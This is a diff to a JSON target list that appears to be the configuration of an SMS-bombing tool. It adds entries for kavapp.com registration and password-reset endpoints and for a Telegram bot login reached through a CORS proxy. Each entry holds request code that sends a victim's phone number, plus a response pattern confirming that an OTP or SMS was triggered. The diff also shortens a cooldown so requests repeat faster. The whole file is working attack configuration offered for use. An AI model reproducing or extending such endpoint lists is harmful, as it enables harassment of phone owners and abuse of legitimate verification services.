@@ -1,9 +1,20 @@
 {
-  "kavapp.com": {
+  "kavapp.com/register": {
     "cooldown": 180000,
 
     "function": {
       "code": "(async function sendRequest() { return await Axios.post('https://api.kavapp.com/admin/registration', { verifiedBy: '1', phone: ('380' + '%phone-number%'), language: 'uk' }, { headers }); })()"
+    },
+
+    "expected_response": {
+      "body": "{\"error\":null,\"message\":null,\"data\":{\"verifiedBy\":\"phone\",\"phone\":\".*?\"}}"
+    }
+  },
+  "kavapp.com/reset-password": {
+    "cooldown": 180000,
+
+    "function": {
+      "code": "(async function sendRequest() { return await Axios.post('https://api.kavapp.com/admin/password-reset', { phone: ('380' + '%phone-number%'), }, { headers }); })()"
     },
 
     "expected_response": {
@@ -53,12 +64,12 @@
     },
 
     "expected_response": {
-      "body": "idk"
+      "body": "{\"data\":{\"codeType\":\"SMS_CODE_SENT\",\"channel\":\"sms\",\"otpLength\":6,\"secondsToExpire\":180},\"error\":null}"
     }
   },
 
   "telegram.org/login-by-bot-531675494": {
-    "cooldown": 180000,
+    "cooldown": 72000,
 
     "function": {
       "code": "(async function sendRequest() { return Axios.post(\"https://cors-anywhere.herokuapp.com/https://oauth.telegram.org/auth/request?bot_id=531675494&origin=https%3A%2F%2Ftelegram.org&embed=1&request_access=write&return_to=https%3A%2F%2Ftelegram.org%2Fblog%2Flogin%3Fsetln%3Dru\", new URLSearchParams({ phone: ('380' + '%phone-number%') }).toString(), { headers: { ...headers, \"Content-type\": \"application/x-www-form-urlencoded\", \"x-requested-with\": \"https://localhost\" }, withCredentials: true }) })()"
